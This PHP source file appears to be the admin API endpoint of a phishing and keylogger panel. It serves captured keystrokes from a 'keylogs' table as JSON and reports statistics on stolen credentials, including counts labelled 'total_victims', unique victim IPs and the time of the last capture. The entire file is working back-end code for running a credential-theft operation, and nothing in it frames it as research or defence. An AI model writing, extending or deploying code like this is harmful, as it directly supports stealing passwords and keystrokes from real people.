<?php
require_once __DIR__ . '/functions.php';
requireAdmin();
header('Content-Type: application/json');
header('X-Content-Type-Options: nosniff');

$type = $_GET['type'] ?? 'keylogs';
$since = isset($_GET['since']) ? (int)$_GET['since'] : 0;

if ($type === 'keylogs') {
    $stmt = $pdo->prepare("SELECT id, email_identifier, key_data, field_context, created_at FROM keylogs WHERE id > :since ORDER BY id DESC LIMIT 50");
    $stmt->execute([':since'=>$since]);
    $logs = $stmt->fetchAll();
    foreach ($logs as &$log) {
        $keys = json_decode($log['key_data'], true);
        $log['keys_display'] = $keys ?: [];
        $log['created_at'] = date('M j, g:i:s A', strtotime($log['created_at']));
    }
    $maxId = !empty($logs) ? $logs[0]['id'] : 0;
    echo json_encode(['status'=>'ok','data'=>$logs,'max_id'=>$maxId]);
    exit;
}

if ($type === 'stats') {
    $stats = [];
    $stats['total_victims'] = (int)$pdo->query("SELECT COUNT(*) FROM credentials")->fetchColumn();
    $stats['today_count'] = (int)$pdo->query("SELECT COUNT(*) FROM credentials WHERE DATE(created_at)=CURDATE()")->fetchColumn();
    $stats['unique_ips'] = (int)$pdo->query("SELECT COUNT(DISTINCT ip) FROM credentials")->fetchColumn();
    $stats['total_keystrokes'] = (int)$pdo->query("SELECT COUNT(*) FROM keylogs")->fetchColumn();
    $row = $pdo->query("SELECT MAX(created_at) FROM credentials")->fetchColumn();
    $stats['last_capture'] = $row ? date('M j, g:i A', strtotime($row)) : 'Never';
    echo json_encode(['status'=>'ok','stats'=>$stats]);
    exit;
}

http_response_code(400);
